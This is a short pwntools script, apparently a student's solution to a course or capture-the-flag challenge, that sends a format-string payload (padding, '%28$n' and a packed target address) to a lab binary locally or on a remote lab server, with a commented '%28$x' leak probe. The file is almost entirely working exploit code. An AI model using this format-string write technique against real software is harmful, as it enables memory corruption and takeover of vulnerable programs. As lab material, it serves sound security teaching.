#!/usr/bin/env python3
from pwn import *
import vpn_conf

HOST = args.HOST or vpn_conf.HOST
PORT = int(args.PORT or vpn_conf.BASE_PORT + 11)

EXE_FILENAME='../pwn_student_binaries/the_answer_marcocastagna99'


libc = None
if args.REMOTE:
     libc = ELF("../pwn_student_binaries/remote-libc/64-bits/libc.so.6")
   

exe = context.binary = ELF(EXE_FILENAME)
argv = [EXE_FILENAME]
envp = {}
gdbscript = '''
set startup-with-shell off
b *0x00401351
'''
#b *0x00401351 
def start():
    if args.GDB:
        return gdb.debug(args=argv, env=envp, gdbscript=gdbscript)
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(argv=argv, env=envp)

io = start()

#io.sendline(b"a"*42 + b"%28$x"+ b"b" + b"\xc8\x4d\x40\x00\x00\x00\x00\x00")
io.sendline(b"a"*42 + b"%28$n"+ b"b"+  b"\xc8\x4d\x40\x00\x00\x00\x00\x00")




response = io.recvuntil(b"Hi, ")
response +=io.recv(2000)
print(response)


io.close()






